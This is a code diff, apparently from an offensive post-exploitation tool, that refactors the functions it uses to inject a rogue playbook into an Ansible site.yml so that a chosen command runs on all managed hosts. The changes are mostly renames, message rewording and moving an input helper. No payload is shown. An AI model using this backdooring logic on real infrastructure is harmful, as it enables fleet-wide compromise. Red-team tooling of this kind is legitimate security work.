@@ -82,7 +82,7 @@ func doCleanup(siteLoc string) {
 	moseutils.TrackChanges(cleanupFile, cleanupFile)
 	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
 	if err != nil {
-		log.Fatalf("Failed to do the cleanup: %v, exiting...", err)
+		log.Fatalln(err)
 	}
 	moseutils.RemoveTracker(cleanupFile, osTarget, ans)
 
@@ -108,41 +108,6 @@ func doCleanup(siteLoc string) {
 		os.Remove(path)
 	}
 	os.Exit(0)
-}
-
-func indexedUserQuestion(question string, osTarget string, validIndices map[int]bool, pp func()) (map[int]bool, error) {
-	reader := bufio.NewReader(os.Stdin)
-	for {
-		var err error
-		fmt.Println(question + "(Provide answer as comma seperated)")
-		text, _ := reader.ReadString('\n')
-		if strings.Contains(text, "q") {
-			return nil, errors.New("Quit")
-		}
-		if osTarget == "windows" {
-			text = text[:len(text)-2]
-		} else {
-			text = text[:len(text)-1]
-		}
-		strnums := strings.Split(text, ",")
-		nums := make(map[int]bool)
-		for _, n := range strnums {
-			n = strings.TrimSpace(n)
-			num, e := strconv.Atoi(n)
-			if e != nil {
-				fmt.Println("Number provided is not an integer, ...")
-				err = e
-			} else if !validIndices[num] {
-				pp()
-				err = errors.New("Number is not within index")
-			} else {
-				nums[num] = true
-			}
-		}
-		if err == nil && len(nums) > 0 {
-			return nums, nil
-		}
-	}
 }
 
 func getSiteFile() string {
@@ -314,7 +279,7 @@ func backupSiteFile() {
 			}
 		}
 	} else {
-		moseutils.ErrMsg("Backup of the (%v.bak.mose) already exists.", path)
+		moseutils.ErrMsg("Backup of the site.yml file already exists (%v.bak.mose), moving on.", path)
 	}
 }
 
@@ -400,18 +365,18 @@ func writeYamlToSite(siteYaml ansible) {
 	if err != nil {
 		log.Fatalf("Error writing %v to %v because of: %v, exiting.", marshalled, files.siteFile, err)
 	}
-	moseutils.Msg("%s successfully created", files.siteFile)
+	moseutils.Msg("Added backdoored code to %s", files.siteFile)
 }
 
 func validateIndicies(data ansible) map[int]bool {
-	validIndex := make(map[int]bool, 0)
+	validIndices := make(map[int]bool, 0)
 	for i, hosts := range data {
 		if hosts.Include == "" {
 			moseutils.Msg("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, hosts.Roles)
-			validIndex[i] = true
+			validIndices[i] = true
 		}
 	}
-	return validIndex
+	return validIndices
 }
 
 func backdoorSiteFile() {
@@ -440,10 +405,10 @@ func backdoorSiteFile() {
 		if debug {
 			log.Println("hosts:all found")
 		}
-		if ans, err := moseutils.AskUserQuestion("Would you like to target all managed nodes? ", a.OsTarget); ans && err == nil {
+		if ans, err := moseutils.AskUserQuestion("Would you like to target all managed hosts? ", a.OsTarget); ans && err == nil {
 			for i, item := range unmarshalled {
 				if strings.Compare(item.Hosts, "all") == 0 {
-					moseutils.Msg("Existing configuration for all hosts found, adding rogue playbook to roles")
+					moseutils.Msg("Existing configuration for all hosts found, adding rogue playbook to associated roles")
 					if unmarshalled[i].Roles == nil {
 						unmarshalled[i].Roles = make([]string, 0)
 					}
@@ -479,9 +444,9 @@ func backdoorSiteFile() {
 		}
 	}
 	moseutils.Info("The following roles were found in the site.yml file: ")
-	validIndex := validateIndicies(unmarshalled)
+	validIndices := validateIndicies(unmarshalled)
 
-	if ans, err := indexedUserQuestion("Provide the index of the location that you want to inject into the site.yml (ex. 1,3,...):", a.OsTarget, validIndex, func() { validateIndicies(unmarshalled) }); err == nil {
+	if ans, err := moseutils.IndexedUserQuestion("Provide the index of the location that you want to inject into the site.yml (ex. 1,3,...):", a.OsTarget, validIndices, func() { validateIndicies(unmarshalled) }); err == nil {
 		for i := range unmarshalled {
 			// Check if the specified location is in the answer
 			if ans[i] {
@@ -650,14 +615,16 @@ func main() {
 	// Create rogue playbooks using ansiblePlaybook.tmpl
 	generatePlaybooks()
 
-	moseutils.Msg("Backdooring %s to run %s on all managed systems, please wait...", files.siteFile, a.Cmd)
+	moseutils.Msg("Backdooring %v to run %s on all managed systems, please wait...", files.siteFile, a.Cmd)
 	backdoorSiteFile()
 
-	fmt.Printf("Gonna change the owner %v", files.uid)
+	if debug {
+		fmt.Printf("Changing owner of the backup file to uid %v\n", files.uid)
+	}
 	if files.uid != -1 && files.gid != -1 {
 		err := os.Chown(files.siteFile, files.uid, files.gid)
 		if err != nil {
-			moseutils.ErrMsg("issues changing owner of backup file")
+			log.Printf("Failed to change owner of the backup file: %v\n", err)
 		}
 	}
 
